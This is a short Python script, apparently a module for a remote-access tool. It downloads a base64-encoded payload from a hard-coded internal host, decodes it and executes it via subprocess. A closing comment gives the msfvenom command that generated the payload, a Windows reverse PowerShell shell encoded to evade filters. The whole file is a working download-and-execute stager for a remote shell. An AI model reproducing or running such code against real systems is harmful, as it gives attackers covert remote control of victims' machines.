import requests
import ctypes
import base64
import subprocess


def run(**args):
    if 'test' in args and args['test']==True:
        return 'Shell code could be running'
    if 'url' in args:
        url = args['url']

    # Retrieve the shell code and decode it ('only accept "bin" files')
    if url[-3:] == 'bin':
        response = requests.get(url)
        shellcode = base64.b64decode(response.text)
        print(shellcode, end='')
        subprocess.call('' + shellcode.decode())


if __name__ == '__main__':
    run(test=False, url='http://10.1.22.123:8000/shell.bin')


'''
Shell generated using:

msfvenom -p cmd/windows/reverse_powershell LHOST="###.###.###.###" LPORT="####" -b '\x00\xff' --encoder cmd/powershell_base64 -i 2 -f raw -o w64_r_t.raw
base64 -i w64_r_t.raw > shell.bin
'''